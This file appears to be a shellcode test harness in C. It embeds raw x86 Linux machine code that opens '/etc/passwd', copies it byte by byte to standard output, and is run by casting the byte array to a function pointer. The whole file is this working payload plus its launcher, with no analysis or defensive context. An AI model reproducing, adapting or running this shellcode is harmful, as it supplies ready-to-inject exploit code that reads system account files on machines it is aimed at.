#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xeb\x2f\x5b\xb0\x05\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x89\xe1\xb2\x01\xcd\x80\x31\xdb\x39\xd8\x74\xe7\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xe0\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
